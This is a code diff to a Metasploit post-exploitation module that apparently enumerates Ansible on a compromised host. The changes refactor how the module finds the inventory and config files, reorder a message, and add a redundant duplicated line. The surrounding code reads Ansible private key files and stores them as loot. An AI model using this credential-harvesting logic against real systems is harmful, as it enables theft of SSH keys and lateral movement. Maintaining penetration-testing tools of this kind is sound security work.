@@ -49,11 +49,13 @@ class MetasploitModule < Msf::Post
   def ansible_inventory
     return @ansible_inv if @ansible_inv
 
-    ['/usr/local/bin/ansible-inventory', datastore['ANSIBLEINVENTORY']].each do |exec|
+    [datastore['ANSIBLEINVENTORY'], '/usr/local/bin/ansible-inventory'].each do |exec|
+      next if exec.empty?
       next unless file?(exec)
       next unless executable?(exec)
 
       @ansible_inv = exec
+      return @ansible_inv
     end
     @ansible_inv
   end
@@ -61,11 +63,13 @@ class MetasploitModule < Msf::Post
   def ansible_cfg
     return @ansible_cfg if @ansible_cfg
 
-    [datastore['ANSIBLECFG'], '/etc/ansible/ansible.cfg', '/playbook/ansible.cfg'].each do |f|
-      next if f.empty?
-      next unless file?(f)
+    [datastore['ANSIBLECFG'], '/etc/ansible/ansible.cfg', '/playbook/ansible.cfg'].each do |cfg|
+      next if cfg.empty?
+      next if cfg.empty?
+      next unless file?(cfg)
 
-      @ansible_cfg = f
+      @ansible_cfg = cfg
+      return @ansible_cfg
     end
     @ansible_cfg
   end
@@ -82,7 +86,6 @@ class MetasploitModule < Msf::Post
 
     results.each do |match|
       table << [match['host'], match['status'], match['ping'], match['changed']]
-      count + 1 if match['ping'] == 'pong'
     end
     print_good(table.to_s) unless table.rows.empty?
   end
@@ -100,8 +103,9 @@ class MetasploitModule < Msf::Post
       next unless line.start_with?('private_key_file')
 
       file = line.split(' = ')[1].strip
-      print_good("Private key file location: #{file}")
       next unless file?(file)
+
+      print_good("Private key file location: #{file}")
 
       key = read_file(file)
       loot = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
